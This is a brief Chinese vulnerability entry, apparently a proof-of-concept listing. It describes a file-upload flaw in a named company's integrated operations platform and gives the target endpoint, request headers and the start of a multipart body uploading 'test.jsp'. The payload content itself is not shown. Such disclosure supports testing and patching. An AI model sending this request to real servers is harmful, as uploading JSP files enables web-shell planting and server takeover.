# 北京中科聚网信息技术有限公司一体化运营平台word接口存在文件上传漏洞

- **系统**：北京中科聚网信息技术有限公司一体化运营平台word接口　|　**类型**：文件上传　|　**CVE**：—
- **请求**：`POST /resources/files/ue/word HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----3d8fa3de-dc1d-4a24-a272-f3…`　`Content-Length: 205`　`Cookie: JSESSIONID=9438c497-92ad-4800-b821-20602adec4ac; rememberMe=DQcKKIuzT47bdNWUqrwb…`

**请求体 / payload**
```
------3d8fa3de-dc1d-4a24-a272-f3e448e5c961
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: application/octet-stream
```